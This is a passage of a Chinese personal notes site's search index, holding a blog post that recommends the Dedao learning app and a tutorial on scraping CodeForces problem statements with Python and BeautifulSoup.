\u65f6\uff0c\u6709\u4e00\u4e2a\u4f18\u5148\u7ea7\u53cd\u8f6c\u7684\u95ee\u9898\u4e0d\u662f\u5f88\u6e05\u695a\uff0c\u6211\u53c8\u5728\u5f97\u5230\u91cc\u9762\u8fdb\u884c\u4e86\u641c\u7d22\uff0c\u7ed3\u679c\u5982\u4e0b\u3002 \\text{Figure 3. \u4f18\u5148\u7ea7\u53cd\u8f6c\u641c\u7d22} \\text{Figure 4. \u4f18\u5148\u7ea7\u53cd\u8f6c\u5185\u5bb9} \u6211\u901a\u8fc7\u5218\u65ed\u660e\u8001\u5e08\u5199\u7684 \u300a\u5d4c\u5165\u5f0f\u5b9e\u65f6\u64cd\u4f5c\u7cfb\u7edf\u539f\u7406\u4e0e\u6700\u4f73\u5b9e\u8df5\u300b \u8fd9\u672c\u4e66\u53c8\u5bf9\u4f18\u5148\u7ea7\u53cd\u8f6c\u3001\u4f18\u5148\u7ea7\u7ee7\u627f\u7b56\u7565\u548c\u4f18\u5148\u7ea7\u5929\u82b1\u677f\u7b56\u7565\u8fdb\u884c\u4e86\u5b66\u4e60\uff0c\u5e76\u4e14\u6458\u5f55\u4e86\u4e00\u90e8\u5206\u5185\u5bb9\u5728 \u300a\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u7684\u4f18\u5148\u7ea7\u53cd\u8f6c\u4e0e\u4e2d\u65ad\u673a\u5236\u300b \u8fd9\u7bc7\u7b14\u8bb0\u4e2d\u3002 \u9664\u4e86\u5229\u7528\u5f97\u5230\u7684\u641c\u7d22\u5f15\u64ce\u4ee5\u5916\uff0c\u76f4\u63a5\u5728\u5f97\u5230\u91cc\u770b\u7535\u5b50\u4e66\u7684\u4f53\u9a8c\u4e5f\u975e\u5e38\u597d\uff0c\u800c\u4e14\u80fd\u5728iPad\u548c\u624b\u673a\u4e0a\u8fdb\u884c\u9605\u8bfb\u5e76\u6dfb\u52a0\u7b14\u8bb0\u3001\u4e66\u7b7e\uff0c\u518d\u4e5f\u4e0d\u7528\u62ff\u51fa\u597d\u51e0\u65a4\u91cd\u7684\u4e66\u51fa\u6765\u7ffb\u4e86\u3002 \u6211\u4e4b\u524d\u4e00\u53e3\u6c14\u52a0\u4e86\u5feb300\u672c\u7535\u5b50\u4e66\u5728\u4e66\u67b6\u4e0a\uff0c\u4e5f\u4e0d\u77e5\u9053\u5565\u65f6\u5019\u80fd\u770b\u5b8c\uff0c\u54c8\u54c8\u3002 \\text{Figure 5. \u4e66\u67b6} \u603b\u4e4b\uff0c \u5f97\u5230\u7684\u77e5\u8bc6\u641c\u7d22\u5f15\u64ce \u80fd\u591f\u7ed9\u6211\u4eec\u7684\u5b66\u4e60\u5e26\u6765\u5f88\u5927\u7684\u4fbf\u5229\uff0c\u7701\u65f6\u9ad8\u6548\u8fd8\u4e0d\u8d35\u3002","title":"2. \u5bf9\u6280\u672f\u4e66\u7c4d\u5185\u5bb9\u8fdb\u884c\u641c\u7d22"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E5%BE%97%E5%88%B0APP/1.%E6%88%91%E4%B8%BA%E4%BB%80%E4%B9%88%E6%8E%A8%E8%8D%90%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%8B%E5%8F%8B%E4%BD%BF%E7%94%A8%E5%BE%97%E5%88%B0APP/#3","text":"\u5982\u679c\u5f97\u5230\u7684\u77e5\u8bc6\u641c\u7d22\u5f15\u64ce\u8fd8\u4e0d\u591f\u5438\u5f15\u4f60\uff0c\u90a3\u4e48\u6211\u6765\u4e3a\u4f60\u4ecb\u7ecd\u7b2c\u4e8c\u4e2a\u63a8\u8350\u7406\u7531\uff1a\u5bf9\u77e5\u8bc6\u9762\u8fdb\u884c\u6269\u5145\u3002 \u5f97\u5230\u4e0a\u9664\u4e86\u6709\u7535\u5b50\u4e66\u4ee5\u5916\uff0c\u8fd8\u6709\u4e0a\u767e\u95e8\u8bfe\u7a0b\u548c\u5bf9\u4e0a\u5343\u672c\u4e66\u7684\u97f3\u9891\u89e3\u8bfb\uff0c\u5185\u5bb9\u6db5\u76d6 \u7ecf\u6d4e\u5b66 \u3001 \u91d1\u878d\u5b66 \u3001 \u5fc3\u7406\u5b66 \u3001 \u5386\u53f2\u5b66 \u548c \u533b\u5b66 \u7b49\u7b49\u5404\u65b9\u9762\u5185\u5bb9\uff0c\u751a\u81f3\u8fd8\u6709\u6559\u4f60 \u600e\u4e48\u4fdd\u62a4\u9888\u690e \u3001 \u600e\u4e48\u83b7\u5f97\u804c\u573a\u7ade\u4e89\u529b \u3001 \u600e\u4e48\u5904\u7406\u804c\u573a\u5173\u7cfb \u3001 \u600e\u4e48\u505a\u597d\u4e00\u4e2a\u4ea7\u54c1 \u3001 \u600e\u4e48\u83b7\u5f97\u7528\u6237\u589e\u957f \u7b49\u7b49\u8bfe\u7a0b\uff0c\u6bcf\u95e8\u8bfe\u7a0b\u4ef7\u683c\u572820-200\u5143\u5de6\u53f3\uff0c20\u5143\u7684\u8bfe\u5927\u6982\u670910\u8282\u7684\u5185\u5bb9\uff0c100\u5143\u7684\u8bfe\u5927\u698230-50\u8282\uff0c200\u5143\u7684\u8bfe\u5c31\u90fd\u662f\u5168\u5e74\u7684\u4e86\uff0c200-300\u8282\u7684\u6837\u5b50\uff0c\u80fd\u591f\u5e2e\u4f60\u7cfb\u7edf\u5730\u4e86\u89e3\u4e00\u4e2a\u9886\u57df\u5185\u7684\u77e5\u8bc6\u3002 \u5728\u5f97\u5230\u91cc\u6700\u53d7\u7a0b\u5e8f\u5458\u670b\u53cb\u6b22\u8fce\u7684\u5e94\u8be5\u5c31\u662f \u5434\u519b\u8001\u5e08 \u4e86\uff0c\u4ed6\u662f\u8c37\u6b4c\u4e2d\u65e5\u97e9\u641c\u7d22\u5f15\u64ce\u7684\u4e3b\u8981\u8bbe\u8ba1\u8005\u3002\u5f88\u591a\u540c\u5b66\u5e94\u8be5\u542c\u8bf4\u8fc7\u5434\u519b\u8001\u5e08\u5199\u7684\u300a\u6570\u5b66\u4e4b\u7f8e\u300b\u3001 \u300a\u6d6a\u6f6e\u4e4b\u5dc5\u300b \u548c\u300a\u7845\u8c37\u4e4b\u8c1c\u300b\u3002 \u5434\u519b\u8001\u5e08\u5728\u5f97\u5230\u91cc\u8bb2 5G \u3001\u8bb2 \u4fe1\u606f\u8bba \u3001\u8bb2 \u6570\u5b66\u601d\u7ef4 \u3001\u8bb2 \u4ed6\u5728\u7845\u8c37\u505a\u6295\u8d44\u4eba\u7684\u7ecf\u9a8c \uff0c\u6536\u83b7\u4e86\u4e00\u4f17\u597d\u8bc4\u3002 \u5f97\u5230\u4e0a\u50cf\u5434\u519b\u8001\u5e08\u8fd9\u6837\u7684\u5e7f\u53d7\u597d\u8bc4\u7684\u8001\u5e08\u8fd8\u6709\u5f88\u591a\uff0c\u6211\u611f\u89c9\u80fd\u8ddf\u7740\u8fd9\u6837\u7684\u8001\u5e08\u5b66\u4e60\uff0c\u4e0d\u5149\u80fd\u591f\u6269\u5c55\u89c6\u91ce\u3001\u953b\u70bc\u601d\u7ef4\uff0c\u800c\u4e14\u8fd8\u80fd\u591f\u8ba9\u6211\u4eec\u77ed\u6682\u5730\u4ece\u73b0\u5b9e\u4e2d\u62bd\u79bb\u51fa\u6765\uff0c\u4e86\u89e3\u5916\u9762\u7684\u4e16\u754c\uff0c \u53cd\u601d\u81ea\u5df1\u7684\u751f\u6d3b \u3002\u518d\u8bf4\u4e86\uff0c\u901a\u8fc7\u8fd9\u6837\u6bd4\u8f83\u8f7b\u677e\u7684\u65b9\u5f0f\u4e86\u89e3\u6765\u81ea\u4e0d\u540c\u884c\u4e1a\u7684\u5404\u79cd\u5404\u6837\u7684\u77e5\u8bc6\uff0c \u672c\u8eab\u4e5f\u662f\u4e00\u79cd\u4eab\u53d7 \u3002","title":"3. \u5bf9\u77e5\u8bc6\u9762\u8fdb\u884c\u6269\u5145"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E5%BE%97%E5%88%B0APP/1.%E6%88%91%E4%B8%BA%E4%BB%80%E4%B9%88%E6%8E%A8%E8%8D%90%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%8B%E5%8F%8B%E4%BD%BF%E7%94%A8%E5%BE%97%E5%88%B0APP/#4","text":"\u7b2c\u4e09\u4e2a\u63a8\u8350\u7406\u7531\u662f\uff1a \u5bf9\u788e\u7247\u65f6\u95f4\u8fdb\u884c\u5229\u7528 \u3002 \u5f97\u5230\u7684\u8bfe\u7a0b\u6709\u4e00\u4e2a\u7279\u70b9\uff0c\u91cc\u9762\u90fd\u662f\u4e13\u4e1a\u7684\u914d\u97f3\u8001\u5e08\u6765\u5f55\u5236\u7684 \u97f3\u9891\u8bfe \uff0c\u5e76\u4e14\u4e5f\u914d\u6709\u6587\u7a3f\u3002\u53ef\u4ee5\u968f\u65f6\u968f\u5730\u6234\u8d77\u8033\u673a\u542c\u8bfe\uff0c\u6ca1\u6709\u7406\u89e3\u7684\u5730\u65b9\u53ef\u4ee5\u770b\u770b\u6587\u7a3f\u3001\u770b\u770b\u91cc\u9762\u7684\u601d\u7ef4\u5bfc\u56fe\u3001\u5176\u4ed6\u540c\u5b66\u7684\u8bc4\u8bba\u8fd8\u6709\u8001\u5e08\u7684\u89e3\u7b54\u3002 \u6211\u662f\u57282018\u5e74\u6691\u5047\u5f00\u59cb\u4f7f\u7528\u5f97\u5230\u7684\uff0c\u90a3\u65f6\u5019\u6211\u4ece\u7f57\u632f\u5b87\u7684 \u300a\u77e5\u8bc6\u5c31\u662f\u529b\u91cf\u300b \u8282\u76ee\u91cc\u9762\u4e86\u89e3\u5230\u4e86\u5f97\u5230\uff0c\u4e8e\u662f\u5c31\u4e0b\u8f7d\u4e0b\u6765\u5c1d\u8bd5\u4e86\u4e00\u4e0b\uff0c\u7ed3\u679c\u975e\u5e38\u5951\u5408\u6211\u5f53\u65f6\u7684\u9700\u8981\u3002 \u56e0\u4e3a\u6211\u5f53\u65f6\u6691\u5047\u7559\u5728\u5b66\u6821\u5b9e\u4e60\uff0c\u6bcf\u5929\u8981\u5750\u4e00\u4e24\u4e2a\u5c0f\u65f6\u7684\u516c\u4ea4\u6216\u8005\u5730\u94c1\u53bb\u516c\u53f8\uff0c\u6bcf\u5929 \u901a\u52e4 \u7684\u65f6\u95f4\u7ecf\u5e38\u8fd8\u6ca1\u6709\u5ea7\u4f4d\uff0c\u7ad9\u5728\u8f66\u4e0a\u770b\u624b\u673a\u4e5f\u4e0d\u65b9\u4fbf\uff0c\u542c\u97f3\u4e50\u542c\u4e45\u4e86\u4e5f\u6bd4\u8f83\u70e6\u8e81\u3002\u800c\u8fd9\u4e2a\u65f6\u5019\u542c\u4e00\u542c\u5f97\u5230\u91cc\u7684\u97f3\u9891\u8bfe\u5c31\u975e\u5e38\u9002\u5408\u3002\u8001\u5e08\u8bb2\u8bfe\u7684\u5185\u5bb9\u4e5f\u5f88\u6709\u8da3\uff0c\u4e0d\u4f1a\u5f88\u67af\u71e5\uff0c\u542c\u8d77\u6765\u4e0d\u4f1a\u7279\u522b\u7d2f\u3002\u6211\u4e00\u4e0b\u5c31\u6210\u4e3a\u4e86\u5f97\u5230\u7684\u5fe0\u5b9e\u7528\u6237\u3002 \u5728\u5b9e\u4e60\u7ed3\u675f\u4ee5\u540e\uff0c\u6211\u53c8\u517b\u6210\u4e86\u6bcf\u5929\u5403\u5b8c\u665a\u996d\u4ee5\u540e\u8fd8\u6709\u7761\u89c9\u4ee5\u524d\u5404\u542c\u534a\u5c0f\u65f6\u5230\u4e00\u5c0f\u65f6\u8bfe\u7684\u4e60\u60ef\u3002\u5230\u73b0\u5728\uff0c \u6211\u5df2\u7ecf\u4f7f\u7528\u4e86\u5f97\u5230607\u5929\u3001\u5b66\u4e60\u4e861207.1\u5c0f\u65f6 \u3002\u4f7f\u7528\u4e86\u5f97\u5230\u8fd9\u4e48\u957f\u65f6\u95f4\uff0c\u6211\u4eec\u5148\u4e0d\u8bf4\u5b83\u5e26\u6765\u7684\u4e00\u4e9b\u601d\u7ef4\u65b9\u9762\u7684\u6539\u53d8\uff0c\u6211\u5149\u662f \u548c\u670b\u53cb\u804a\u5929\u7684\u8c08\u8d44\u5c31\u591a\u4e86\u4e0d\u5c11 \u3002\u5728\u8ba8\u8bba\u4e00\u4e2a\u95ee\u9898\u7684\u9002\u5408\uff0c\u6211\u4eec\u53ef\u4ee5\u501f\u52a9\u542c\u8fc7\u7684\u8bfe\u7a0b\u53bb\u8fdb\u884c\u4e0d\u540c\u89d2\u5ea6\u7684\u601d\u8003\uff0c\u8fd8\u80fd \u968f\u65f6\u5f15\u7528\u8001\u5e08\u8bb2\u8fc7\u7684\u5185\u5bb9 \uff0c\u51cf\u5c11\u4e00\u4e9b\u56e0\u4e3a\u6ca1\u6709\u8bdd\u9898\u800c\u5bfc\u81f4\u7684\u5c2c\u804a\u3002","title":"4. \u5bf9\u788e\u7247\u65f6\u95f4\u8fdb\u884c\u5229\u7528"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E5%BE%97%E5%88%B0APP/1.%E6%88%91%E4%B8%BA%E4%BB%80%E4%B9%88%E6%8E%A8%E8%8D%90%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%8B%E5%8F%8B%E4%BD%BF%E7%94%A8%E5%BE%97%E5%88%B0APP/#5","text":"\u5f88\u591a\u4eba\u8bf4\u7f57\u632f\u5b87\u5728\u8d29\u5356\u7126\u8651\uff0c\u4e5f\u6709\u4eba\u8bf4\u6216\u6574\u4e2a\u77e5\u8bc6\u4ed8\u8d39\u9886\u57df\u90fd\u662f\u5728\u8d29\u5356\u7126\u8651\u3001\u5272\u97ed\u83dc\u3002\u674e\u8bde\u8fd8\u5728\u5947\u8469\u8bf4\u7b2c\u516d\u5b63\u7b2c\u4e00\u671f\u8bf4\u7f57\u632f\u5b87\u662f\u201c\u641e\u4f20\u9500\u7684\u201c\u3002 \\text{Figure 6. \u5947\u8469\u8bf4\u7b2c\u516d\u5b63\u7b2c\u4e00\u671f} \u4f46\u5176\u5b9e\u6211\u89c9\u5f97\uff0c\u4ec0\u4e48\u53eb\u505a\u8d29\u5356\u7126\u8651\uff0c\u6211\u53ef\u4ee5\u5c1d\u8bd5\u7740\u7ed9\u4ed6\u4e0b\u4e00\u4e2a\u5b9a\u4e49\uff1a \u544a\u8bc9\u4f60\u522b\u4eba\u6709\u5149\u660e\u4f1f\u5927\u7684\u524d\u7a0b\uff0c\u4e0e\u4f60\u7684\u8747\u8425\u72d7\u82df\u5f62\u6210\u9c9c\u660e\u7684\u5bf9\u7167\u3002 \u7ed9\u4f60\u704c\u8f93\u4e00\u4e9b\u770b\u4f3c\u6b63\u786e\u7684\u62bd\u8c61\u6210\u529f\u5b66\uff0c\u544a\u8bc9\u4f60\u5982\u679c\u505a\u4e0d\u5230\u8fd9\u4e00\u70b9\uff0c\u4f60\u79bb\u6210\u529f\u5c31\u8d8a\u6765\u8d8a\u8fdc\u3002 \u6bd4\u5982\u4ec0\u4e48\u300a\u6210\u529f\u4eba\u58eb\u5fc5\u5907\u7684\u4e24\u4e2a\u4e60\u60ef\u300b\uff0c\u300a\u4ed6\u5982\u4f55\u8f7b\u8f7b\u677e\u677e\u5e74\u5165\u767e\u4e07\u300b\uff0c\u7ed3\u679c\u70b9\u8fdb\u53bb\u4e00\u770b\u544a\u8bc9\u4f60\u4e00\u8981\u81ea\u5f8b\u4e8c\u8981\u52aa\u529b\u3002\u8fd9\u79cd\u6587\u7ae0\u7eaf\u7cb9\u5c31\u662f\u4e3a\u4e86\u8ba9\u4f60\u70b9\u8fdb\u53bb\u8d5a\u4e00\u70b9\u5e7f\u544a\u6d41\u91cf\u3002 \u800c\u5f97\u5230\u4e0d\u540c\uff0c\u5c31\u50cf\u7f57\u632f\u5b87\u57282020\u5e74\u8de8\u5e74\u6f14\u8bb2\u4e0a\u6240\u8bf4\u7684\uff0c\u6211\u4eec\u90fd\u662f \u505a\u4e8b\u7684\u4eba \uff0c\u8981\u89e3\u51b3\u7684\u662f \u5177\u4f53\u7684\u95ee\u9898 \u3002\u8001\u5e08\u4eec\u5e26\u4f60\u62bd\u8c61\u51fa\u4e00\u4e2a\u4e2a\u9886\u57df\u6a21\u578b\u4ee5\u540e\uff0c\u53c8\u4f1a\u5e26\u4f60\u56de\u5230\u73b0\u5b9e\uff0c\u544a\u8bc9\u4f60\u600e\u4e48\u7528\u5b83\u6765\u6307\u5bfc\u751f\u6d3b\u3002\u6700\u8fd1\u5f97\u5230\u8fd8\u4e0a\u7ebf\u4e86\u201c\u5341\u4e07\u4e2a\u600e\u4e48\u529e\u201d\u77e5\u8bc6\u5de5\u7a0b\uff0c\u7531\u5404\u884c\u4e1a\u7684\u8d44\u6df1\u4eba\u58eb\u4eec\u6765\u89e3\u7b54\u7528\u6237\u4eec\u4e00\u4e2a\u4e2a\u5177\u4f53\u7684\u95ee\u9898\u3002 \u6211\u89c9\u5f97\u8fd9\u4e0d\u662f\u8d29\u5356\u7126\u8651\u7684\u6001\u5ea6\uff0c\u8fd9\u662f\u7684\u7684\u786e\u786e\u5728\u505a\u77e5\u8bc6\u670d\u52a1\u7684\u6001\u5ea6\u3002 \u597d\u4e86\uff0c\u6211\u7684\u5b89\u5229\u5df2\u7ecf\u5b8c\u6210\u4e86\u3002\u5982\u679c\u540c\u5b66\u4eec\u611f\u5174\u8da3\u53ef\u4ee5\u4ece\u5e94\u7528\u5546\u5e97\u4e0b\u8f7d\u5f97\u5230\u8bd5\u7528\u4e00\u4e0b\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7 \u6211\u5206\u4eab\u7684\u94fe\u63a5 \u6ce8\u518c\uff0c\u80fd\u591f \u989d\u5916\u83b7\u5f9720\u5143\u4f18\u60e0\u5238 \u3002 \\text{Figure 7. \u9080\u8bf7\u7801} \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"5. \u5f97\u5230\u662f\u5728\u8d29\u5356\u7126\u8651\u5417"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/1.Python%E7%88%AC%E5%8F%96CodeForces%E9%A2%98%E7%9B%AE/","text":"Python\u722c\u53d6CodeForces\u9898\u76ee # \u76ee\u5f55 # Python\u722c\u53d6CodeForces\u9898\u76ee \u76ee\u5f55 1. \u80cc\u666f 2. \u524d\u671f\u51c6\u5907 3. \u83b7\u53d6\u7f51\u9875\u5185\u5bb9 4. \u5185\u5bb9\u5904\u7406 4.1. Limit 4.2. Problem Description 4.3. Input 4.4. Output 4.5. Sample Input & Output 4.6. Note 4.7. Source 5. \u8f93\u51fa 1. \u80cc\u666f # \u6700\u8fd1\u505a\u9898\u7684\u65f6\u5019\u8981\u5199\u4e00\u4e9b\u9898\u89e3\uff0c\u5728\u628a CodeForces \u7684\u9898\u76ee\u590d\u5236\u4e0b\u6765\u7684\u65f6\u5019\uff0c\u6570\u5b66\u516c\u5f0f\u7684\u5904\u7406\u6bd4\u8f83\u9ebb\u70e6\uff0c\u6240\u4ee5\u6211\u7528 Python \u7684 urllib.request \u548c BeautifulSoup4 \u5e93\u5bf9\u9898\u76ee\u4fe1\u606f\u8fdb\u884c\u4e86\u722c\u53d6\uff0c\u5199\u9898\u89e3\u7684\u65f6\u5019\u65f6\u95f4\u8282\u7ea6\u4e86\u5f88\u591a\u3002 \u8003\u8651\u5230\u5927\u5bb6\u53ef\u80fd\u4e5f\u4f1a\u9047\u5230\u540c\u6837\u7684\u95ee\u9898\uff0c\u5199\u4e00\u7bc7\u7b14\u8bb0\u5206\u4eab\u7ed9\u5927\u5bb6\u3002 2. \u524d\u671f\u51c6\u5907 # \u5b89\u88c5 urllib \u548c BeautifulSoup \u5e93\u3002 pip3 install urllib pip3 install beautifulsoup4 3. \u83b7\u53d6\u7f51\u9875\u5185\u5bb9 # \u4ee5 CodeForces 1353 B. Two Arrays And Swaps \u4e3a\u4f8b\u3002 # \u5bfc\u5165\u5e93 import urllib.request import bs4 from bs4 import BeautifulSoup # \u9898\u76ee\u5c5e\u6027 problemSet = \"1353\" problemId = \"B\" # \u9898\u76ee\u94fe\u63a5 url = f\"https://codeforces.com/problemset/problem/{problemSet}/{problemId}\" # \u83b7\u53d6\u7f51\u9875\u5185\u5bb9 html = urllib.request.urlopen(url).read() # \u683c\u5f0f\u5316 soup = BeautifulSoup(html,'lxml') # \u5b58\u50a8 data_dict = {} # \u627e\u5230\u4e3b\u4f53\u5185\u5bb9 mainContent = soup.find_all(name=\"div\", attrs={\"class\" :\"problem-statement\"})[0] 4. \u5185\u5bb9\u5904\u7406 # 4.1. Limit # \u5148\u4ece\u6bd4\u8f83\u7b80\u5355\u7684\u4fe1\u606f\u5165\u624b\uff0c\u627e\u5230\u9898\u76ee\u6807\u9898\u3001\u65f6\u95f4\u3001\u548c\u5185\u5b58\u9650\u5236\u3002 # Limit # \u627e\u5230\u9898\u76ee\u6807\u9898\u3001\u65f6\u95f4\u3001\u548c\u5185\u5b58\u9650\u5236 # Title data_dict['Title'] = f\"CodeForces {problemSet} \" + mainContent.find_all(name=\"div\", attrs={\"class\":\"title\"})[0].contents[-1] # Time Limit data_dict['Time Limit'] = mainContent.find_all(name=\"div\", attrs={\"class\":\"time-limit\"})[0].contents[-1] # Memory Limit data_dict['Memory Limit'] = mainContent.find_all(name=\"div\", attrs={\"class\":\"memory-limit\"})[0].contents[-1] \u5b9a\u4e49\u51fd\u6570\uff0c\u5904\u7406\u4e3b\u4f53\u5185\u5bb9\u4e2d\u8be1\u5f02\u7684\u7a7a\u683c\u548c\u516c\u5f0f\u7684\u4e09\u4e2a\u7f8e\u5143\u7b26\u53f7 $$$ \u3002 def divTextProcess(div): \"\"\" \u5904\u7406<div>\u6807\u7b7e\u4e2d<p>\u7684\u6587\u672c\u5185\u5bb9 \"\"\" strBuffer = '' # \u904d\u5386\u5904\u7406\u6bcf\u4e2a<p>\u6807\u7b7e for each in div.find_all(\"p\"): for content in each.contents: # \u5982\u679c\u4e0d\u662f\u7b2c\u4e00\u4e2a\uff0c\u52a0\u6362\u884c\u7b26 if (strBuffer != ''): strBuffer += '\\n\\n' # \u5904\u7406 if (type(content) != bs4.element.Tag): # \u5982\u679c\u662f\u6587\u672c\uff0c\u6dfb\u52a0\u81f3\u5b57\u7b26\u4e32buffer\u4e2d strBuffer += content.replace(\" \", \" \").replace(\"$$$\", \"$\") else: # \u5982\u679c\u662fhtml\u5143\u7d20\uff0c\u5982span\u7b49\uff0c\u52a0\u4e0a\u7c97\u4f53 strBuffer += \"**\" + content.contents[0].replace(\" \", \" \").replace(\"$$$\", \"$\") + \"**\" # \u8fd4\u56de\u7ed3\u679c return strBuffer 4.2. Problem Description # \u83b7\u53d6\u9898\u76ee\u63cf\u8ff0\uff0c\u7531\u4e8e\u9898\u76ee\u63cf\u8ff0\u7684 <div> \u6807\u7b7e\u6ca1\u6709 id \u548c class \u5c5e\u6027\uff0c\u8fd9\u91cc\u901a\u8fc7\u627e\u5217\u8868\u4e2d\u7b2c 10 \u4e2a div \u7684\u65b9\u5f0f\u6765\u83b7\u53d6\u3002 # \u5904\u7406\u9898\u76ee\u63cf\u8ff0 data_dict['Problem Description'] = divTextProcess(mainContent.find_all(\"div\")[10]) 4.3. Input # \u8f93\u5165\u63cf\u8ff0 div = mainContent.find_all(name=\"div\", attrs={\"class\":\"input-specification\"})[0] data_dict['Input'] = divTextProcess(div) 4.4. Output # \u8f93\u51fa\u63cf\u8ff0 div = mainContent.find_all(name=\"div\", attrs={\"class\":\"output-specification\"})[0] data_dict['Output'] = divTextProcess(div) 4.5. Sample Input & Output # \u8f93\u5165\u6837\u4f8b\uff0c\u7528\u4ee3\u7801\u6846\u73af\u5883\u5305\u56f4\u3002 # Input div = mainContent.find_all(name=\"div\", attrs={\"class\":\"input\"})[0] data_dict['Sample Input'] = \"```cpp\" + div.find_all(\"pre\")[0].contents[0] + '```' # Onput div = mainContent.find_all(name=\"div\", attrs={\"class\":\"output\"})[0] data_dict['Sample Output'] = \"```cpp\" + div.find_all(\"pre\")[0].contents[0] + '```' 4.6. Note # \u6837\u4f8b\u8bf4\u660e div = mainContent.find_all(name=\"div\", attrs={\"class\":\"note\"})[0] data_dict['Note'] = divTextProcess(div) 4.7. Source # \u9898\u76ee\u94fe\u63a5 data_dict['Source'] = '[' + data_dict['Title'] + ']' + '(' + url + ')' 5. \u8f93\u51fa # for each in data_dict.keys(): print('### ' + each + '\\n') print(data_dict[each].replace(\"\\n\\n**\", \"**\").replace(\"**\\n\\n\", \"**\") + '\\n') \u4e0b\u9762\u662f\u6700\u540e\u7684\u8f93\u51fa\u7ed3\u679c ### Title CodeForces 1353 B. Two Arrays And Swaps ### Time Limit 1 second ### Memory Limit 256 megabytes ### Problem Description You are given two arrays $a$ and $b$ both consisting of $n$ positive (greater than zero) integers. You are also given an integer $k$. In one move, you can choose two indices $i$ and $j$ ($1 \\le i, j \\le n$) and swap $a_i$ and $b_j$ (i.e. $a_i$ becomes $b_j$ and vice versa). Note that $i$ and $j$ can be equal or different (in particular, swap $a_2$ with $b_2$ or swap $a_3$ and $b_9$ both are acceptable moves). Your task is to find the **maximum** possible sum you can obtain in the array $a$ if you can do no more than (i.e. at most) $k$ such moves (swaps). You have to answer $t$ independent test cases. ### Input The first line of the input contains one integer $t$ ($1 \\le t \\le 200$) \u2014 the number of test cases. Then $t$ test cases follow. The first line of the test case contains two integers $n$ and $k$ ($1 \\le n \\le 30; 0 \\le k \\le n$) \u2014 the number of elements in $a$ and $b$ and the maximum number of moves you can do. The second line of the test case contains $n$ integers $a_1, a_2, \\dots, a_n$ ($1 \\le a_i \\le 30$), where $a_i$ is the $i$-th element of $a$. The third line of the test case contains $n$ integers $b_1, b_2, \\dots, b_n$ ($1 \\le b_i \\le 30$), where $b_i$ is the $i$-th element of $b$. ### Output For each test case, print the answer \u2014 the **maximum** possible sum you can obtain in the array $a$ if you can do no more than (i.e. at most) $k$ swaps. ### Sample Input // \u8fd9\u91cc\u4f1a\u6709```cpp\u4ee3\u7801\u73af\u5883\uff0c\u5728\u8fd9\u91cc\u4e3a\u4e86\u5c55\u793a\u65b9\u4fbf\u53bb\u6389\u4e86 5 2 1 1 2 3 4 5 5 5 5 6 6 5 1 2 5 4 3 5 3 1 2 3 4 5 10 9 10 10 9 4 0 2 2 4 3 2 4 2 3 4 4 1 2 2 1 4 4 5 4 ### Sample Output 6 27 39 11 17 ### Note In the first test case of the example, you can swap $a_1 = 1$ and $b_2 = 4$, so $a=[4, 2]$ and $b=[3, 1]$. In the second test case of the example, you don't need to swap anything. In the third test case of the example, you can swap $a_1 = 1$ and $b_1 = 10$, $a_3 = 3$ and $b_3 = 10$ and $a_2 = 2$ and $b_4 = 10$, so $a=[10, 10, 10, 4, 5]$ and $b=[1, 9, 3, 2, 9]$. In the fourth test case of the example, you cannot swap anything. In the fifth test case of the example, you can swap arrays $a$ and $b$, so $a=[4, 4, 5, 4]$ and $b=[1, 2, 2, 1]$. ### Source [CodeForces 1353 B. Two Arrays And Swaps](https://codeforces.com/problemset/problem/1353/B) \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.Python\u722c\u53d6CodeForces\u9898\u76ee"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/1.Python%E7%88%AC%E5%8F%96CodeForces%E9%A2%98%E7%9B%AE/#pythoncodeforces","text":"","title":"Python\u722c\u53d6CodeForces\u9898\u76ee"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/1.Python%E7%88%AC%E5%8F%96CodeForces%E9%A2%98%E7%9B%AE/#_1","text":"Python\u722c\u53d6CodeForces\u9898\u76ee \u76ee\u5f55 1. \u80cc\u666f 2. \u524d\u671f\u51c6\u5907 3. \u83b7\u53d6\u7f51\u9875\u5185\u5bb9 4. \u5185\u5bb9\u5904\u7406 4.1. Limit 4.2. Problem Description 4.3. Input 4.4. Output 4.5. Sample Input & Output 4.6. Note 4.7. Source 5. \u8f93\u51fa","title":"\u76ee\u5f55"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/1.Python%E7%88%AC%E5%8F%96CodeForces%E9%A2%98%E7%9B%AE/#1","text":"\u6700\u8fd1\u505a\u9898\u7684\u65f6\u5019\u8981\u5199\u4e00\u4e9b\u9898\u89e3\uff0c\u5728\u628a CodeForces \u7684\u9898\u76ee\u590d\u5236\u4e0b\u6765\u7684\u65f6\u5019\uff0c\u6570\u5b66\u516c\u5f0f\u7684\u5904\u7406\u6bd4\u8f83\u9ebb\u70e6\uff0c\u6240\u4ee5\u6211\u7528 Python \u7684 